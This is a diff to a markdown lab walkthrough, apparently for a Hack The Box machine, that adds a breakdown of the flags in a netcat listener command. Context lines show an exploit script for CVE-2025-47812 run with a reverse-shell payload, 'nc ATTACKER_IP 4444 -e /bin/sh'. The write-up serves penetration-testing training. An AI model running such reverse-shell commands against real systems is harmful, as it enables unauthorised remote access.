@@ -572,8 +572,20 @@ wingftp
 
 Once RCE is confirmed, the logical next step is to move from single command execution to an interactive shell.
 
-- **Listener:** On your Kali machine, start a listener: `nc -lvnp 4444`.
-- **Exploit:** Run the script with a bash reverse shell payload:
+**Listener:** On your Kali machine, start a listener: `nc -lvnp 4444`.
+
+**Breakdown:**
+
+- `-l` Description: Listen Mode | Purpose: Sets netcat to wait for an incoming connection.
+    
+- `-v` Description: Verbose | Purpose: Displays information about the connection source.
+    
+- `-n` Description: No DNS | Purpose: Prevents delays by not resolving hostnames.
+    
+- `-p 4444` Description: Port Number | Purpose: Matches the port used in the exploit payload.
+
+
+**Exploit:** Run the script with a bash reverse shell payload:
 
 Command: `python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc ATTACKER_IP 4444 -e /bin/sh" -v`
 
